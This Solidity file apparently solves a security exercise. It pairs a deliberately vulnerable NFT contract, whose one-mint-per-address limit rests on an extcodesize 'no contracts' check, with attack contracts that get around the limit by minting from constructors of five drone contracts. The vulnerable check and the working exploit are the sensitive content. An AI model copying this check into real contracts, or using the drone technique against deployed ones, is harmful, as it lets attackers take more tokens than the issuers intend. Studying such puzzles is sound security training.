// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.20;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint3 is ERC721 {
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint3", "AT") {}

    function mint() external {
        require(!isContract(msg.sender), "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    /// @dev OZ Address.sol dependency mustve updated so manually doing it here
    function isContract(address _addr) public returns (bool isContract) {
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }
}

/// @dev the mint checks for a contract but if you call from a contracts constructor
/// you can bypass the check. This is because the contract does not have any bytecode yet.
/// We create an additional drone contract to do each mint and then deploy 5 drones in the 
/// main contract constructor.
contract Overmint3Attack {
    Overmint3 overmint;

    constructor(address _overmint) {
        overmint = Overmint3(_overmint);
        Overmint3AttackDrone drone1 = new Overmint3AttackDrone(address(overmint));
        Overmint3AttackDrone drone2 = new Overmint3AttackDrone(address(overmint));
        Overmint3AttackDrone drone3 = new Overmint3AttackDrone(address(overmint));
        Overmint3AttackDrone drone4 = new Overmint3AttackDrone(address(overmint));
        Overmint3AttackDrone drone5 = new Overmint3AttackDrone(address(overmint));
    }

}

/// @dev inspired by Thomas Harper's solution
contract Overmint3AttackDrone {
    Overmint3 overmint;

    constructor(address _overmint) {
        overmint = Overmint3(_overmint);
        overmint.mint();
        uint tokenId = overmint.totalSupply();
        overmint.transferFrom(address(this), msg.sender, tokenId);
    }
}
